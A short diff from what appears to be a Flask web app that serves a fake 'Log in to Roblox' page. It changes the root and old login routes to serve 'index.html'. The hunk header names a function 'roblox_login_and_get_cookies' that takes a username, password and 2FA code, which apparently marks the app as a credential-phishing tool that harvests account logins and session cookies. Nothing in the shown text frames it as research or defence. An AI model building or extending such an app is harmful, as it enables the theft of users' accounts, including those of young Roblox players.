@@ -294,11 +294,11 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
 
 @app.route('/')
 def login_page():
-    return app.send_static_file('Log in to Roblox.html')
+    return app.send_static_file('index.html')
 
 @app.route('/login.html')
 def old_login_page():
-    return render_template('login.html')
+    return app.send_static_file('index.html')
 
 @app.route('/login', methods=['POST'])
 def login():
